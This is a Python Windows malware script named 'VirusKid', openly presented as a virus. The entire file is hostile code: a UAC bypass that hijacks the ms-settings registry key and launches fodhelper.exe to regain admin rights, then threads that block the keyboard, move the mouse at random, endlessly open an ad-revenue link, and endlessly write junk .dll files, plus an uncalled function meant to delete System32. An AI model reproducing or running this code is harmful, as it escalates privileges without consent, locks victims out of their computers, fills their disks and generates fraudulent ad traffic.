"""
VirusKid
Don't run this script

By QuocAnh aka ryz.
"""

import os
import keyboard
import sys
import webbrowser
import pyautogui
import random
import ctypes
import winreg
import threading
import string

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''    
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def execute():        
    if not is_running_as_admin():
        try:                
            current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))  # Sửa lại cách lấy đường dẫn
            cmd = '{} /k "{}"'.format(CMD, sys.argv[0])  # Sửa lại để chỉ định đúng đường dẫn
            bypass_uac(cmd)                
            os.system(FOD_HELPER)
            sys.exit(1)                               
        except WindowsError:
            sys.exit(1)

def lock_keyboard():
    keyboard.block_key('all')

def random_mouse():
    width, height = pyautogui.get_window_size()
    while True:
        x = random.randint(0, width-1)
        y = random.randint(0, height-1)
        pyautogui.moveTo(x, y, duration=0.1)

def destroy():
    os.remove(r"C:\Windows\System32")

def spam():
    while True:
        webbrowser.open("https://www.cpmrevenuegate.com/bj6eafmtmj?key=d096c15bfe5518f295daa3f9147ce751")

def sFile():
    while True:
        name = ''.join(random.choices(string.ascii_lowercase, k=10)) + ".dll"
        content = ("0100100001100101011011000110110001101111001011000010000001001001001001110110110100100000011100100111100101111010001011100010000001100001"
                   "011011000110111001101111011000110100110001000000011010110110111001101111011101110110111000100000011000010111001100100000010100010111010101101111"
                   "01100001100000101110101100001101001011011110110001001111001101000011000001101100011001000010100001110100011011001101110001101010110101001101111"
                   "01110100110001111001001000000110111001101100011010000110111001101101011010100110110000101110010111110111001001100111011010101110100011011110111000"
                   "011101000101100100000111100100001000011000010000110000001110001100101101101101110010110010111101110011011110010100111101111011001000001110")
        with open(name, "a") as f:
            f.write(content)

def main():
    execute()  # Kiểm tra quyền admin trước khi chạy các thread
    lock = threading.Thread(target=lock_keyboard)
    mouse = threading.Thread(target=random_mouse)
    opentab = threading.Thread(target=spam)
    sf = threading.Thread(target=sFile)
    lock.start()
    mouse.start()
    sf.start()
    opentab.start()

if __name__ == "__main__":
    main()
